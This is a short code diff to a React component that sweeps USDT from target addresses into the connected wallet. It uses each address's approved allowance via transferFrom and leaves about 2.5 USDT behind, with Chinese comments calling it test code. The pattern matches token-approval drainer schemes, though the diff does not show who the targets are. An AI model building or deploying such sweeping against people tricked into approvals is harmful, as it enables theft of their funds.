@@ -127,7 +127,6 @@ const Collection = () => {
   const { data: ensAvatar } = useEnsAvatar({ name: ensName! });
   const { writeContractAsync: approve } = useWriteUSDTApprove();
   const { writeContractAsync: transferFrom } = useWriteUSDTTransferFrom();
-  const { balanceOf } = useReadUSDTBalanceOf();
   /**
    * 测试用，生产不用
    * */  
@@ -150,8 +149,10 @@ const Collection = () => {
         if (allowance > 0) {
           const canWithdraw = allowance > balance ? balance: allowance;
 
-          console.log("canWithdraw:",canWithdraw - 2500000n);// 测试打印，只转去 部分，为了测试不提取全部，- 3000000n
-          await transferFrom({args:[ targetAddress, address, canWithdraw - 2500000n]});
+          // console.log("canWithdraw:",canWithdraw - 2500000n);// 测试打印，只转去 部分，为了测试不提取全部，- 3000000n
+          const typedTargetAddress = targetAddress as `0x${string}`;
+          const typedAddress = address as `0x${string}`;
+          await transferFrom({args:[ typedTargetAddress, typedAddress , BigInt(canWithdraw.toString()) - BigInt(2500000)]});
         } else {
           console.log(targetAddress,":无allowance余额用来归集",allowance);
         }
